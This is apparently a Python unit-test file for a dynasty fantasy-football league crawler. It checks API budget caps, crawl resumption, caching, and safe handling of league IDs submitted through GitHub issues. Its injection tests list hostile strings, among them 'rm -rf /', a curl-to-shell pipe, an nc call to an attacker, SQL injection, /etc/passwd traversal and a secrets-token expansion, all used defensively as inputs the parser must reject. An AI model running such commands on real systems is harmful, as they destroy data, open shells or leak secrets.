"""Corpus growth: budget enforcement, crawl resumption, caching, submissions.

Runs on the standard library alone (``python3 -m unittest``) with **no
network**, like the rest of the cross-league coverage. Every Sleeper and
GitHub response here is a fixture, deliberately: the properties under test
are decisions and invariants, and a test that needed the live API to prove
"the budget cannot be exceeded" would be proving it about today's Sleeper
rather than about this code.

The four things this file exists to pin down:

1. **The budget cannot be exceeded.** Not "is usually respected" -- cannot.
   A crawl that overruns its cap on a bad day is how a free, unauthenticated
   API turns into an IP block.
2. **A crawl resumes rather than repeats.** This is the entire mechanism by
   which the corpus grows instead of re-buying the same five leagues daily.
3. **Caching is safe as well as cheap.** The cost saving is worthless if a
   half-played season can be pinned on disk. (The cache decision table lives
   in tests/js/sleeper_cache_tests.js, invoked from here.)
4. **Issue submissions cannot become an injection vector.** Untrusted text
   from strangers reaches a parser that may only ever return digits.
"""
from __future__ import annotations

import json
import shutil
import subprocess
import sys
import tempfile
import unittest
import urllib.error
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT / "src"))
sys.path.insert(0, str(REPO_ROOT / "scripts"))

from dynasty import crawl_state as cs  # noqa: E402

NODE = shutil.which("node")


def _load_script(name: str):
    """Import a scripts/*.py module by path (they are not a package)."""
    import importlib.util
    spec = importlib.util.spec_from_file_location(
        f"_script_{name}", REPO_ROOT / "scripts" / f"{name}.py")
    mod = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = mod
    spec.loader.exec_module(mod)
    return mod


def _python_code_only(path: Path) -> str:
    """Source with comments and string literals removed.

    The "this file must not contain X" assertions below are about executable
    code, and this project documents its threat model *in* the files it
    protects. A naive substring search finds the word ``subprocess`` in a
    docstring that exists precisely to say subprocess is never used, which
    would make the safety tests fail on good code and — far worse — push a
    future author to delete the explanation rather than the risk.
    """
    import io
    import tokenize
    out = []
    with open(path, "rb") as fh:
        for tok in tokenize.tokenize(fh.readline):
            if tok.type in (tokenize.COMMENT, tokenize.STRING):
                continue
            out.append(tok.string)
    return " ".join(out)


def _yaml_code_only(path: Path) -> str:
    """Workflow YAML with whole-line ``#`` comments removed.

    Same reasoning as ``_python_code_only``: the workflow header explains
    which triggers and interpolations are forbidden, and naming them there
    must not trip the test that enforces their absence.
    """
    lines = path.read_text(encoding="utf-8").splitlines()
    return "\n".join(ln for ln in lines if not ln.lstrip().startswith("#"))


# ==========================================================================
# 1. The budget cannot be exceeded
# ==========================================================================

class TestBudgetIsAHardCeiling(unittest.TestCase):
    """Prove the cap, do not assume it.

    The crawler's ``Sleeper.get`` is the single chokepoint for every
    discovery call. Every one of these tests drives it with a transport that
    *counts* and always succeeds, so nothing but the budget logic can stop
    it. If a call slips past the cap it shows up as a count, not as a
    judgement call about whether the code looks right.
    """

    def setUp(self):
        self.crawl = _load_script("crawl_cross_league")

    def _counting_sleeper(self, budget):
        sl = self.crawl.Sleeper(budget, verbose=False)
        calls = {"n": 0}
        real_open = self.crawl.urllib.request.urlopen

        def fake_get(url, default=None):
            # Reimplementing get() would test nothing, so drive the real one
            # with its network call replaced.
            return sl.__class__.get(sl, url, default)

        class _Resp:
            def __init__(self, payload):
                self._p = payload

            def read(self):
                return json.dumps(self._p).encode()

            def __enter__(self):
                return self

            def __exit__(self, *a):
                return False

        def fake_urlopen(req, timeout=None):
            calls["n"] += 1
            return _Resp({"league_id": "1", "settings": {"type": 2}})

        self.crawl.urllib.request.urlopen = fake_urlopen
        self.addCleanup(setattr, self.crawl.urllib.request, "urlopen", real_open)
        return sl, calls, fake_get

    def test_never_exceeds_max_calls_however_hard_it_is_pushed(self):
        b = self.crawl.Budget(max_calls=7, max_leagues=99, max_hops=9,
                              min_delay_s=0.0)
        sl, calls, get = self._counting_sleeper(b)

        # 500 DISTINCT urls (distinct so the in-process cache cannot be what
        # saves us) against a budget of 7.
        for i in range(500):
            get(f"https://api.sleeper.app/v1/league/{i}")

        self.assertEqual(calls["n"], 7,
                         "the transport was reached more times than the cap")
        self.assertEqual(b.calls, 7)
        self.assertEqual(b.remaining, 0)
        self.assertEqual(b.refused, 493,
                         "every call over the cap must be counted as refused, "
                         "not silently dropped")

    def test_discovery_sub_cap_binds_before_the_total(self):
        """Discovery must not be able to spend the whole run.

        Discovery is cheap per call but unbounded in breadth: a wide frontier
        will happily walk thousands of users. Without its own ceiling a run
        can burn its entire budget before scoring a single league, which is
        a crawl that discovers forever and indexes nothing.
        """
        b = self.crawl.Budget(max_calls=100, max_leagues=99, max_hops=9,
                              min_delay_s=0.0, max_discovery_calls=5)
        sl, calls, get = self._counting_sleeper(b)
        for i in range(50):
            get(f"https://api.sleeper.app/v1/league/{i}")

        self.assertEqual(calls["n"], 5, "discovery ignored its sub-cap")
        self.assertEqual(b.remaining, 95,
                         "the rest of the budget must survive for scoring")

    def test_wall_clock_expiry_stops_calls(self):
        b = self.crawl.Budget(max_calls=1000, max_leagues=99, max_hops=9,
                              min_delay_s=0.0, max_seconds=-1)   # already over
        sl, calls, get = self._counting_sleeper(b)
        for i in range(20):
            get(f"https://api.sleeper.app/v1/league/{i}")
        self.assertEqual(calls["n"], 0,
                         "an expired wall clock must stop the crawl dead")
        self.assertTrue(b.expired())

    def test_in_process_cache_does_not_spend_budget(self):
        b = self.crawl.Budget(max_calls=3, max_leagues=9, max_hops=9,
                              min_delay_s=0.0)
        sl, calls, get = self._counting_sleeper(b)
        for _ in range(40):
            get("https://api.sleeper.app/v1/league/same")
        self.assertEqual(calls["n"], 1,
                         "a repeated URL must be served from memory; the "
                         "social graph is full of cycles and an uncached "
                         "walk would spend the whole budget on nothing")
        self.assertEqual(b.calls, 1)

    def test_harness_request_never_offers_more_than_the_budget_left(self):
        """The node harness is handed `remaining`, never `max_calls`.

        Both halves of the run draw on one budget. Handing the scorer the
        original cap after discovery has already spent some of it would let
        a run overshoot by exactly the discovery cost.
        """
        b = self.crawl.Budget(max_calls=600, max_leagues=5, max_hops=2,
                              min_delay_s=0.0)
        b.discovery_calls = 120
        self.assertEqual(b.remaining, 480)

        src = (REPO_ROOT / "scripts" / "crawl_cross_league.py").read_text()
        self.assertIn('"maxCalls": budget.remaining', src,
                      "the harness must be capped at what is LEFT")
        self.assertNotIn('"maxCalls": budget.max_calls', src)

    def test_budget_reports_cache_hits_separately_from_calls(self):
        """A cache hit is free; counting it as a call would understate reach,
        and folding it into calls would overstate load on Sleeper."""
        b = self.crawl.Budget(max_calls=10, max_leagues=1, max_hops=1,
                              min_delay_s=0.0)
        b.cache_hits = 250
        d = b.to_dict()
        self.assertEqual(d["cache_hits_served_free"], 250)
        self.assertEqual(d["calls_used_total"], 0,
                         "cache hits must never count toward the API budget")


# ==========================================================================
# 2. The crawl resumes rather than repeats
# ==========================================================================

class TestIncrementalResumption(unittest.TestCase):

    def setUp(self):
        self.td = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.td, True)
        self.path = self.td / "crawl_state.json"

    def test_frontier_survives_a_run(self):
        """The whole mechanism in one test: what run N left, run N+1 finds."""
        st = cs.empty_state(2026)
        st = cs.record_discovery(
            st,
            frontier=[("900", 2), ("901", 2)],
            seen_leagues=["100", "200"],
            seen_users=["u1", "u2"],
            dynasty=[{"league_id": "100", "name": "A", "hop": 0}],
        )
        cs.save_state(self.path, st)

        again = cs.load_state(self.path, 2026)
        self.assertEqual([f["league_id"] for f in again["frontier"]],
                         ["900", "901"])
        self.assertEqual(set(again["seen_leagues"]), {"100", "200"})
        self.assertEqual(set(again["seen_users"]), {"u1", "u2"})
        self.assertIn("100", again["known_dynasty"])

    def test_an_examined_league_is_not_re_walked(self):
        st = cs.empty_state(2026)
        st["seen_leagues"] = ["100"]
        st = cs.merge_seed_frontier(st, ["100", "101"])
        self.assertEqual([f["league_id"] for f in st["frontier"]], ["101"],
                         "a seed already examined must not be re-expanded; "
                         "that is what made the old crawl a treadmill")

    def test_every_seed_is_reachable_from_a_cold_state(self):
        st = cs.merge_seed_frontier(cs.empty_state(2026), ["1", "2", "3"])
        self.assertEqual([f["league_id"] for f in st["frontier"]],
                         ["1", "2", "3"])

    def test_corrupt_state_degrades_to_a_cold_start(self):
        self.path.write_text("{not json", encoding="utf-8")
        st = cs.load_state(self.path, 2026)
        self.assertEqual(st["frontier"], [])
        self.assertEqual(st["known_dynasty"], {})

    def test_schema_change_degrades_to_a_cold_start(self):
        self.path.write_text(json.dumps({"schema": "something-else",
                                         "frontier": [{"league_id": "x"}]}))
        self.assertEqual(cs.load_state(self.path, 2026)["frontier"], [])

    def test_season_rollover_resets_the_walk_but_keeps_the_leagues(self):
        """A new NFL year invalidates the frontier, not the corpus.

        Discovery enumerates ONE season so dynasty chains de-duplicate
        soundly. Last season's frontier holds league ids that are no longer
        the ids being enumerated, so carrying them over would suppress this
        season's leagues. What must survive is the ledger of leagues already
        found and scored -- that is the accumulated value.
        """
        st = cs.empty_state(2025)
        st = cs.record_discovery(st, frontier=[("900", 1)],
                                 seen_leagues=["100"], seen_users=["u1"],
                                 dynasty=[{"league_id": "100", "name": "A"}])
        st = cs.record_scoring(st, [{"league_id": "100", "ok": True}])
        cs.save_state(self.path, st)

        rolled = cs.load_state(self.path, 2026)
        self.assertEqual(rolled["frontier"], [], "stale frontier dropped")
        self.assertEqual(rolled["seen_leagues"], [], "stale walk dropped")
        self.assertIn("100", rolled["known_dynasty"], "leagues kept")
        self.assertIn("100", rolled["scored"], "scoring ledger kept")
        self.assertEqual(rolled["season_rolled_from"], 2025)

    def test_provenance_of_a_league_is_never_rewritten(self):
        st = cs.record_discovery(
            cs.empty_state(2026), frontier=[], seen_leagues=[], seen_users=[],
            dynasty=[{"league_id": "1", "discovered_via": "alice", "hop": 1}])
        first_seen = st["known_dynasty"]["1"]["first_seen_at"]

        st = cs.record_discovery(
            st, frontier=[], seen_leagues=[], seen_users=[],
            dynasty=[{"league_id": "1", "discovered_via": "bob", "hop": 2}])
        self.assertEqual(st["known_dynasty"]["1"]["discovered_via"], "alice",
                         "how a league entered the corpus is a fact about "
                         "history and must not be overwritten")
        self.assertEqual(st["known_dynasty"]["1"]["first_seen_at"], first_seen)


class TestScoringPriority(unittest.TestCase):
    """New leagues get the budget; that is what makes the corpus grow."""

    def _state(self, n_new=5, n_old=5):
        st = cs.empty_state(2026)
        dyn = [{"league_id": f"new{i}", "name": f"N{i}", "hop": 1}
               for i in range(n_new)]
        dyn += [{"league_id": f"old{i}", "name": f"O{i}", "hop": 1}
                for i in range(n_old)]
        st = cs.record_discovery(st, frontier=[], seen_leagues=[],
                                 seen_users=[], dynasty=dyn)
        st = cs.record_scoring(st, [{"league_id": f"old{i}", "ok": True}
                                    for i in range(n_old)])
        return st

    def test_never_scored_leagues_come_first(self):
        plan = cs.plan_scoring(self._state(), max_leagues=4,
                               new_league_share=1.0, scoring_budget=1600)
        self.assertEqual(len(plan["new"]), 4)
        self.assertEqual(plan["refresh"], [])

    def test_the_reserved_share_limits_how_many_new_leagues_are_attempted(self):
        """A run must not queue more new leagues than it can afford.

        Each new league costs ~160 calls (a full dynasty chain, uncached).
        Queueing ten against a 320-call reservation would mean eight of them
        hit the budget mid-read and get DISCARDED -- calls spent for no
        score at all.
        """
        plan = cs.plan_scoring(self._state(), max_leagues=99,
                               new_league_share=1.0, scoring_budget=320,
                               est_calls_new=160)
        self.assertEqual(len(plan["new"]), 2)

    def test_leftover_capacity_refreshes_the_stalest_leagues(self):
        plan = cs.plan_scoring(self._state(n_new=1, n_old=5), max_leagues=4,
                               new_league_share=1.0, scoring_budget=1600)
        self.assertEqual(len(plan["new"]), 1)
        self.assertEqual(len(plan["refresh"]), 3)

    def test_a_zero_share_run_refreshes_only(self):
        plan = cs.plan_scoring(self._state(), max_leagues=3,
                               new_league_share=0.0, scoring_budget=1600)
        self.assertEqual(plan["new"], [])
        self.assertEqual(len(plan["refresh"]), 3)

    def test_a_failing_league_cannot_monopolise_the_queue(self):
        """A permanently unreadable league must age out of the front.

        Recording only successes would leave it forever in "never scored",
        retried first on every run, spending calls on the same failure daily.
        """
        st = cs.empty_state(2026)
        st = cs.record_discovery(st, frontier=[], seen_leagues=[],
                                 seen_users=[],
                                 dynasty=[{"league_id": "bad"},
                                          {"league_id": "good"}])
        st = cs.record_scoring(st, [{"league_id": "bad", "ok": False,
                                     "reason": "private"},
                                    {"league_id": "good", "ok": True}])
        plan = cs.plan_scoring(st, max_leagues=9, new_league_share=1.0,
                               scoring_budget=1600)
        self.assertEqual(plan["new"], [],
                         "an attempted league is no longer 'never scored'")
        ids = [L["league_id"] for L in plan["refresh"]]
        self.assertEqual(ids[-1], "bad",
                         "a failing league sorts behind healthy ones")

    def test_summary_reports_the_queue_not_just_the_index(self):
        st = self._state(n_new=7, n_old=2)
        s = cs.state_summary(st)
        self.assertEqual(s["n_dynasty_leagues_discovered"], 9)
        self.assertEqual(s["n_scored_ok"], 2)
        self.assertEqual(s["n_never_scored"], 7)


# ==========================================================================
# 3. The permanent cache
# ==========================================================================

class TestPermanentCache(unittest.TestCase):

    def test_cache_decision_table(self):
        """Delegated to node: the cache is JS, so assert it where it runs."""
        if not NODE:
            self.skipTest("node not available — cache assertions skipped")
        suite = REPO_ROOT / "tests" / "js" / "sleeper_cache_tests.js"
        proc = subprocess.run([NODE, str(suite)], capture_output=True,
                              text=True)
        self.assertEqual(proc.returncode, 0,
                         f"cache assertions failed:\n{proc.stdout}\n{proc.stderr}")

    def test_cache_module_is_valid_js(self):
        if not NODE:
            self.skipTest("node not available")
        mod = REPO_ROOT / "scripts" / "js" / "sleeper_disk_cache.js"
        proc = subprocess.run([NODE, "--check", str(mod)],
                              capture_output=True, text=True)
        self.assertEqual(proc.returncode, 0, proc.stderr)

    def test_harness_consults_the_cache_before_the_budget(self):
        """Ordering is load-bearing and easy to 'tidy' into a bug.

        If the budget check came first, a league whose history is entirely on
        disk would stop being scorable the moment the budget ran low -- which
        is precisely the case the cache exists to serve, since serving it
        costs Sleeper nothing.
        """
        src = (REPO_ROOT / "scripts" / "js" /
               "score_league_harness.js").read_text()
        cache_read = src.index("const cached = cache.read(url)")
        budget_check = src.index("if (budget.calls >= MAX_CALLS) {",
                                 src.index("function instrumentedFetch"))
        self.assertLess(cache_read, budget_check,
                        "the cache must be consulted before the budget check")

    def test_only_successful_responses_are_cached(self):
        """Caching a 404 or a 500 turns one bad day into a permanent one."""
        src = (REPO_ROOT / "scripts" / "js" /
               "score_league_harness.js").read_text()
        self.assertIn("if (r.ok) cache.write(url, t);", src)

    def test_a_cache_hit_is_not_counted_as_a_refusal(self):
        """A hit must not look like incomplete data.

        The harness DISCARDS any league that had a call refused. If a cache
        hit ever incremented `leagueRefused`, every cached league would be
        thrown away -- the cache would make the corpus smaller.
        """
        src = (REPO_ROOT / "scripts" / "js" /
               "score_league_harness.js").read_text()
        start = src.index("const cached = cache.read(url)")
        # Exactly the cache-hit branch: from the read to the close of its
        # `if`. Reading further would run into the budget check, which is a
        # different branch and legitimately does set leagueRefused.
        block = src[start:src.index("\n  }", start)]
        self.assertNotIn("leagueRefused", block,
                         "a cache hit must not mark the league as having had "
                         "an incomplete read; the harness discards those, so "
                         "the cache would make the corpus smaller")
        self.assertIn("budget.cache_hits++", block)


# ==========================================================================
# 3b. Valuation wiring: the bug that made every manager score exactly 100
# ==========================================================================

class TestValuationArtifactsReachTheScorer(unittest.TestCase):
    """The corpus must be able to PRICE something.

    The shipped page loads two artifacts: ``managerscore_values.json`` maps a
    Sleeper player id to a KTC id, and ``managerscore_series.json`` holds the
    dated price history that says what that asset was worth *on the day it
    was traded*. ``msCaptureForPlayer`` needs both — the first to identify the
    asset, the second to value it.

    The harness served only the first. So ``MSX.series`` was null on every
    crawl, ``msCapture`` answered "no value recorded on or before this date"
    for every asset in every league, and the published corpus came out with
    every component at n=0 and every manager at exactly index 100.

    Nothing failed. The crawl succeeded, the leagues scored, the artifact
    validated, the page rendered. It was simply empty, and it looked exactly
    like a corpus of real but very inactive leagues — which is why it shipped
    and why the owner, not a test, is what caught it.

    Measured on one real league before and after the fix:

        before:  evaluable   0, tooRecent 49, offBoard 752  -> all index 100
        after:   evaluable 447, tooRecent 88, offBoard 266  -> 100.8 .. 116.5
    """

    def test_the_harness_serves_every_artifact_the_page_loads(self):
        from dynasty.managerscore_js import (MANAGERSCORE_CORE_JS,
                                             MANAGERSCORE_UI_JS)
        harness = (REPO_ROOT / "scripts" / "js" /
                   "score_league_harness.js").read_text()

        # Whatever msLoadValues fetches, the harness has to answer. The
        # harness evaluates CORE + UI together, so look in the same union
        # rather than assuming which half declares the loader.
        page = MANAGERSCORE_CORE_JS + MANAGERSCORE_UI_JS
        start = page.index("function msLoadValues")
        loader = page[start:start + 500]
        for artifact in ("managerscore_values.json",
                         "managerscore_series.json"):
            self.assertIn(artifact, loader,
                          "test is out of date with the page loader")
            self.assertIn(artifact, harness,
                          f"the harness must serve {artifact}; a 404 here is "
                          f"silently swallowed by msGetJSONSoft and produces "
                          f"a corpus where every manager scores exactly 100")

    def test_the_values_writer_emits_what_the_harness_serves(self):
        """Pin the contract between the Python producer and the JS consumer."""
        from dynasty import managerscore
        consensus = REPO_ROOT / "data" / "consensus"
        if not consensus.exists():
            self.skipTest("no consensus data in this checkout")
        with tempfile.TemporaryDirectory() as td:
            out = Path(td)
            managerscore.write_values_artifact(out, consensus_dir=consensus)
            for artifact in ("managerscore_values.json",
                             "managerscore_series.json"):
                self.assertTrue((out / artifact).exists(),
                                f"{artifact} must be written next to the "
                                f"values file; the harness resolves it as a "
                                f"sibling of valuesPath")

    def test_a_missing_series_refuses_to_publish(self):
        """Fail loudly instead of publishing a corpus that measures nothing.

        This is the guard that would have caught the original bug. It runs
        the real harness with a values file but no series, and requires a
        non-zero exit rather than a cheerful, empty artifact. No network: the
        refusal happens during artifact load, before any league is read.
        """
        if not NODE:
            self.skipTest("node not available")
        from dynasty.managerscore_js import (MANAGERSCORE_CORE_JS,
                                             MANAGERSCORE_UI_JS)
        with tempfile.TemporaryDirectory() as td:
            td = Path(td)
            (td / "ms.js").write_text(
                MANAGERSCORE_CORE_JS + MANAGERSCORE_UI_JS, encoding="utf-8")
            (td / "managerscore_values.json").write_text(
                json.dumps({"available": True, "by_sleeper": {}}),
                encoding="utf-8")
            # managerscore_series.json deliberately absent.
            (td / "req.json").write_text(json.dumps({
                "leagues": [{"league_id": "1", "name": "nope"}],
                "valuesPath": str(td / "managerscore_values.json"),
                "historyDir": str(td / "ktc_history"),
                "maxCalls": 0, "minDelayMs": 0, "concurrency": 1,
            }), encoding="utf-8")

            proc = subprocess.run(
                [NODE, str(REPO_ROOT / "scripts" / "js" /
                           "score_league_harness.js"),
                 str(td / "ms.js"), str(td / "req.json")],
                capture_output=True, text=True, timeout=120)

            self.assertNotEqual(proc.returncode, 0,
                                "a harness that cannot price anything must "
                                "not exit successfully")
            payload = json.loads(proc.stdout)
            self.assertFalse(payload.get("ok"))
            self.assertIn("series", (payload.get("error") or "").lower())

    def test_the_committed_corpus_actually_measured_something(self):
        """The end-to-end smell test, against the artifact in this checkout.

        A corpus in which no manager has a single scored transaction is the
        exact signature of the bug above. It cannot be distinguished from
        real data by shape, only by the fact that nothing is ever non-zero.
        """
        path = REPO_ROOT / "data" / "cross_league" / "corpus.json"
        if not path.exists():
            self.skipTest("no committed corpus in this checkout")
        corpus = json.loads(path.read_text(encoding="utf-8"))
        board = corpus.get("leaderboard") or []
        if not board:
            self.skipTest("empty corpus")

        scored = sum(
            1 for row in board
            for comp in (row.get("components") or {}).values()
            if (comp or {}).get("n")
        )
        self.assertGreater(
            scored, 0,
            "every manager in the committed corpus has n=0 on every "
            "component. That is not a quiet league, it is a corpus that "
            "priced nothing — check that managerscore_series.json reached "
            "the scoring harness")

        self.assertTrue(
            any(row.get("cross_index") not in (None, 100.0) for row in board),
            "every manager scored exactly 100.0, which means no asset was "
            "ever valued")


# ==========================================================================
# 4. Submissions: the untrusted-input boundary
# ==========================================================================

class TestSubmissionParsingIsSafe(unittest.TestCase):
    """``extract_league_id`` is the entire trust boundary.

    It receives arbitrary text written by strangers on the internet and may
    return exactly one thing: a string of digits, or nothing. These cases are
    the ones that would matter if it ever returned anything else.
    """

    def setUp(self):
        self.mod = _load_script("ingest_league_submissions")

    def form(self, value):
        return ("### Sleeper league id\n\n"
                f"{value}\n\n"
                "### Confirmation\n\n- [X] yes\n")

    def test_reads_the_form_field(self):
        got, _ = self.mod.extract_league_id(self.form("1316222126914539520"))
        self.assertEqual(got, "1316222126914539520")

    def test_reads_a_bare_id_without_the_template(self):
        got, _ = self.mod.extract_league_id("please add\n1316222126914539520\n")
        self.assertEqual(got, "1316222126914539520")

    def test_shell_metacharacters_yield_nothing(self):
        for hostile in [
            "123; rm -rf /",
            "$(curl evil.sh | sh)",
            "`id`",
            "123 && echo pwned",
            "123|nc attacker 4444",
            "'; DROP TABLE seeds; --",
            "../../etc/passwd",
            "${{ secrets.GITHUB_TOKEN }}",
            "<script>alert(1)</script>",
            "123\n0000000000000000000",
        ]:
            got, _ = self.mod.extract_league_id(self.form(hostile))
            self.assertIsNone(got, f"parser accepted {hostile!r}")

    def test_a_body_that_is_pure_injection_yields_nothing(self):
        got, _ = self.mod.extract_league_id(
            "${{ secrets.GITHUB_TOKEN }}\n$(whoami)\n`cat /etc/passwd`")
        self.assertIsNone(got)

    def test_ambiguity_is_refused_rather_than_guessed(self):
        got, why = self.mod.extract_league_id(
            "1316222126914539520\n1312163562143121408\n")
        self.assertIsNone(got)
        self.assertIn("one issue per league", why)

    def test_empty_and_blank_bodies(self):
        self.assertIsNone(self.mod.extract_league_id(None)[0])
        self.assertIsNone(self.mod.extract_league_id("")[0])
        self.assertIsNone(self.mod.extract_league_id(self.form(""))[0])

    def test_whatever_it_returns_is_always_digits(self):
        """The invariant, stated as an invariant.

        Anything that is not a bare integer string reaching the registry
        would be a bug in this function, so assert the shape of the output
        rather than only the specific hostile inputs above.
        """
        bodies = [self.form("1316222126914539520"), "1312163562143121408",
                  self.form("$(id)"), "", "### Sleeper league id\n\n#\n"]
        for b in bodies:
            got, _ = self.mod.extract_league_id(b)
            if got is not None:
                self.assertTrue(got.isdigit(), f"non-digit escaped: {got!r}")
                self.assertRegex(got, r"^[0-9]{6,24}$")

    def test_the_ingest_script_has_no_shell_or_eval(self):
        """Structural guarantee, not a promise in a comment."""
        src = _python_code_only(
            REPO_ROOT / "scripts" / "ingest_league_submissions.py")
        for forbidden in ("subprocess", "os.system", "eval", "exec",
                          "shell", "popen", "__import__"):
            self.assertNotIn(forbidden, src,
                             f"issue text must never reach {forbidden}")


class TestSubmissionValidation(unittest.TestCase):
    """An id must be a REAL dynasty league before it is trusted."""

    def setUp(self):
        self.mod = _load_script("ingest_league_submissions")

    def fetcher(self, payload, *, error=None):
        def f(url):
            if error:
                raise error
            return payload
        return f

    def test_accepts_a_real_dynasty_league(self):
        ok, why, meta = self.mod.validate_league("1", fetch=self.fetcher({
            "league_id": "1", "name": "DLD", "sport": "nfl",
            "season": "2026", "total_rosters": 12, "settings": {"type": 2}}))
        self.assertTrue(ok, why)
        self.assertEqual(meta["name"], "DLD")

    def test_rejects_a_keeper_league(self):
        ok, why, _ = self.mod.validate_league("1", fetch=self.fetcher({
            "league_id": "1", "name": "Deke Dynasty", "sport": "nfl",
            "settings": {"type": 1}}))
        self.assertFalse(ok)
        self.assertIn("keeper", why)

    def test_rejects_a_redraft_league(self):
        ok, why, _ = self.mod.validate_league("1", fetch=self.fetcher({
            "league_id": "1", "sport": "nfl", "settings": {"type": 0}}))
        self.assertFalse(ok)
        self.assertIn("redraft", why)

    def test_name_matching_is_not_used(self):
        """'Deke Dynasty' is type=1. The name must never decide."""
        ok, _, _ = self.mod.validate_league("1", fetch=self.fetcher({
            "league_id": "1", "name": "Ultimate Dynasty Dynasty!",
            "sport": "nfl", "settings": {"type": 1}}))
        self.assertFalse(ok)

    def test_rejects_a_nonexistent_league(self):
        err = urllib.error.HTTPError("u", 404, "nf", {}, None)
        ok, why, _ = self.mod.validate_league("1",
                                              fetch=self.fetcher(None, error=err))
        self.assertFalse(ok)
        self.assertIn("no league", why)

    def test_rejects_a_non_nfl_league(self):
        ok, why, _ = self.mod.validate_league("1", fetch=self.fetcher({
            "league_id": "1", "sport": "nba", "settings": {"type": 2}}))
        self.assertFalse(ok)
        self.assertIn("NFL", why)

    def test_a_sleeper_outage_rejects_rather_than_accepts(self):
        ok, _, _ = self.mod.validate_league(
            "1", fetch=self.fetcher(None, error=TimeoutError("boom")))
        self.assertFalse(ok, "an unreachable Sleeper must fail closed")

    def test_league_name_comes_from_sleeper_never_from_the_issue(self):
        src = (REPO_ROOT / "scripts" / "ingest_league_submissions.py").read_text()
        self.assertIn('"name": lg.get("name")', src)
        self.assertNotIn('issue.get("title")', src)


class TestSeedRegistryWrites(unittest.TestCase):

    def setUp(self):
        self.mod = _load_script("ingest_league_submissions")
        self.td = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.td, True)
        self.seeds = self.td / "seeds.json"
        self.seeds.write_text(json.dumps({
            "_comment": "keep me", "season": 2026,
            "seeds": [{"league_id": "1", "note": "hand written"}]}))

    def test_appends_a_validated_league(self):
        added = self.mod.append_seed(self.seeds, "2", {"name": "X"}, 42, "alice")
        self.assertTrue(added)
        reg = json.loads(self.seeds.read_text())
        entry = [s for s in reg["seeds"] if s["league_id"] == "2"][0]
        self.assertEqual(entry["issue"], 42)
        self.assertEqual(entry["submitted_by"], "alice")
        self.assertEqual(entry["added_by"], "issue-submission")

    def test_is_idempotent(self):
        self.assertTrue(self.mod.append_seed(self.seeds, "2", {}, 1, "a"))
        self.assertFalse(self.mod.append_seed(self.seeds, "2", {}, 2, "b"),
                         "a duplicate submission must not append twice")
        self.assertEqual(len(json.loads(self.seeds.read_text())["seeds"]), 2)

    def test_preserves_hand_written_content(self):
        self.mod.append_seed(self.seeds, "2", {}, 1, "a")
        reg = json.loads(self.seeds.read_text())
        self.assertEqual(reg["_comment"], "keep me")
        self.assertEqual(reg["seeds"][0]["note"], "hand written",
                         "an operator's note is not ours to overwrite")


class TestSubmissionWorkflowSafety(unittest.TestCase):
    """Properties of the workflow file itself.

    The script can be perfectly safe and still be undone by the YAML around
    it, so the workflow gets its own assertions.
    """

    def setUp(self):
        self.wf = _yaml_code_only(REPO_ROOT / ".github" / "workflows" /
                                  "league-submissions.yml")

    def test_no_issue_text_is_interpolated_into_a_shell(self):
        """The classic injection sink in an issue-triggered workflow."""
        for sink in ("github.event.issue.body", "github.event.issue.title",
                     "github.event.comment.body"):
            self.assertNotIn(sink, self.wf,
                             f"{sink} must never be expanded into a run step")

    def test_does_not_use_pull_request_target(self):
        """The trigger that hands write credentials to a fork's code."""
        self.assertNotIn("pull_request_target", self.wf)

    def test_permissions_are_least_privilege(self):
        self.assertIn("contents: write", self.wf)
        self.assertIn("issues: write", self.wf)
        for excessive in ("packages: write", "id-token: write",
                          "actions: write", "permissions: write-all"):
            self.assertNotIn(excessive, self.wf)

    def test_the_run_is_bounded(self):
        self.assertIn("--max-issues", self.wf,
                      "a flood of issues must not become unbounded work")

    def test_the_routing_label_is_created_not_assumed(self):
        """An issue form cannot apply a label that does not exist.

        GitHub skips unknown labels in a form's ``labels:`` list silently --
        it does not create them. On a repository where the label has never
        been defined (which is the state this feature ships into: the live
        repo has only the nine default labels), every submission would arrive
        unlabelled, the workflow gate would never match, the sweep would find
        nothing, and nothing anywhere would report an error.
        """
        mod = _load_script("ingest_league_submissions")
        self.assertTrue(hasattr(mod.GitHub, "ensure_labels"))
        src = _python_code_only(
            REPO_ROOT / "scripts" / "ingest_league_submissions.py")
        self.assertIn("ensure_labels", src)
        # Idempotency: an existing label answers 422 and must be ignored.
        self.assertIn("422", src)

    def test_template_label_matches_what_the_ingest_queries(self):
        """Template, workflow gate and API query must agree on one string."""
        mod = _load_script("ingest_league_submissions")
        tpl = (REPO_ROOT / ".github" / "ISSUE_TEMPLATE" /
               "league-submission.yml").read_text()
        self.assertIn(mod.SUBMISSION_LABEL, tpl)
        self.assertIn(mod.SUBMISSION_LABEL, self.wf)

    def test_the_issue_template_declares_its_own_label(self):
        """A ?labels= query parameter silently fails for non-collaborators.

        The submitters are visitors with no repo access, so the label has to
        come from the template or nothing ever reaches the ingest job.
        """
        tpl = (REPO_ROOT / ".github" / "ISSUE_TEMPLATE" /
               "league-submission.yml").read_text()
        self.assertIn('labels: ["league-submission"]', tpl)
        self.assertIn("id: league_id", tpl)

    def test_the_page_links_to_the_template_not_to_a_labels_parameter(self):
        from dynasty.crossleague_js import CROSSLEAGUE_JS
        self.assertIn("template=league-submission.yml", CROSSLEAGUE_JS)
        self.assertNotIn("issues/new?labels=", CROSSLEAGUE_JS)


# ==========================================================================
# 5. Honest coverage copy
# ==========================================================================

class TestCoverageCopyStaysHonest(unittest.TestCase):

    def test_the_sentence_is_built_from_real_counts(self):
        from dynasty import crossleague
        s = crossleague.coverage_sentence(
            {"coverage": {"n_managers": 340, "n_leagues": 28}})
        self.assertEqual(
            s, "ranked against 340 managers across 28 dynasty leagues "
               "we've indexed")

    def test_the_page_says_the_sample_is_not_random(self):
        """The specific caveat a social-graph crawl requires.

        "Not a census" is not enough on its own: a reader can hear that as
        "a smaller but representative slice". The reachable set is socially
        determined, which is a bias, not a sample size.
        """
        from dynasty import crossleague_page
        html = crossleague_page._methodology_html()
        self.assertIn("not a random sample", html.lower())
        self.assertIn("socially near", html.lower())

    def test_the_page_never_claims_to_cover_sleeper(self):
        from dynasty import crossleague_page
        from dynasty.crossleague_js import CROSSLEAGUE_JS
        html = crossleague_page._methodology_html() + CROSSLEAGUE_JS
        for overclaim in ("every dynasty league on Sleeper",
                          "all dynasty leagues on Sleeper",
